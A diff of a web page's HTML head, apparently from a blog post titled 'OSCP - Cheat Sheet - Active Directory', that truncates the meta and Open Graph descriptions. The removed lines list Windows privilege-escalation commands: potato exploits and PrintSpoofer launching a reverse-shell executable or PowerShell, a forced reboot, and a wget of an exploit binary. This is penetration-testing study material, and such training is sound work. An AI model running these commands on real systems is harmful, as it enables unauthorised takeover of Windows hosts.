@@ -7,8 +7,7 @@
   <meta http-equiv="content-type" content="text/html; charset=utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <meta name="description" content="HackTricks - AD Methodology
-Initial Access whoami, whoami /all whoami /priv SeImpersonatePrivilege Run SweetPotato ./sweetpotato.exe -a &quot;C:\Users\Public\revshell.exe&quot; FullPowers tool How to use potatoes &amp; - Pre-compiled Potatoes How to use Juicy/Rogue Potato &amp; Printspoofer Printspoofer - GitHub .\PrintSpoofer64.exe -i -c powershell.exe whoami Juicy Potato - Github .\juicypotato.exe -l -p c:\Users\tony\revshell.exe -t * -c &quot;{9E175B9C-F52A-11D8-B9A5-505054503030}&quot; SEbackupPriv https://exploit-notes.hdks.org/exploit/windows/privilege-escalation/windows-privesc-with-sebackupprivilege/ https://github.com/nickvourd/Windows-Local-Privilege-Escalation-Cookbook/blob/master/Notes/SeBackupPrivilege.md SeShutdownPrivilege Can a startup process be modified? Then modify &amp; reboot Check service has Auto: `Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like &lsquo;httpd&rsquo;} Reboot: shutdown /r /t 0 SeManageVolumePrivilege wget https://github.com/CsEnox/SeManageVolumeExploit/releases/download/public/SeManageVolumeExploit.exe whoami /groups, net localgroup or Get-LocalGroup (Existing groups) Get-LocalGroupMember groupname (Inspect) systeminfo (wiki build number) Windows kernel exploits More Initial Access
-" />
+Initial Access whoami, whoami /all whoami /priv SeImpersonatePrivilege Run SweetPotato ./sweetpotato.exe -a …" />
 <meta name="keywords" content="" />
 
   <meta name="robots" content="noodp" />
@@ -81,8 +80,7 @@ Initial Access whoami, whoami /all whoami /priv SeImpersonatePrivilege Run Sweet
 <meta property="og:type" content="article" />
 <meta property="og:title" content="OSCP - Cheat Sheet - Active Directory">
 <meta property="og:description" content="HackTricks - AD Methodology
-Initial Access whoami, whoami /all whoami /priv SeImpersonatePrivilege Run SweetPotato ./sweetpotato.exe -a &quot;C:\Users\Public\revshell.exe&quot; FullPowers tool How to use potatoes &amp; - Pre-compiled Potatoes How to use Juicy/Rogue Potato &amp; Printspoofer Printspoofer - GitHub .\PrintSpoofer64.exe -i -c powershell.exe whoami Juicy Potato - Github .\juicypotato.exe -l -p c:\Users\tony\revshell.exe -t * -c &quot;{9E175B9C-F52A-11D8-B9A5-505054503030}&quot; SEbackupPriv https://exploit-notes.hdks.org/exploit/windows/privilege-escalation/windows-privesc-with-sebackupprivilege/ https://github.com/nickvourd/Windows-Local-Privilege-Escalation-Cookbook/blob/master/Notes/SeBackupPrivilege.md SeShutdownPrivilege Can a startup process be modified? Then modify &amp; reboot Check service has Auto: `Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like &lsquo;httpd&rsquo;} Reboot: shutdown /r /t 0 SeManageVolumePrivilege wget https://github.com/CsEnox/SeManageVolumeExploit/releases/download/public/SeManageVolumeExploit.exe whoami /groups, net localgroup or Get-LocalGroup (Existing groups) Get-LocalGroupMember groupname (Inspect) systeminfo (wiki build number) Windows kernel exploits More Initial Access
-" />
+Initial Access whoami, whoami /all whoami /priv SeImpersonatePrivilege Run SweetPotato ./sweetpotato.exe -a …" />
 <meta property="og:url" content="/posts/oscp---cheat-sheet---active-directory/" />
 <meta property="og:site_name" content="Digital Garden" />
 
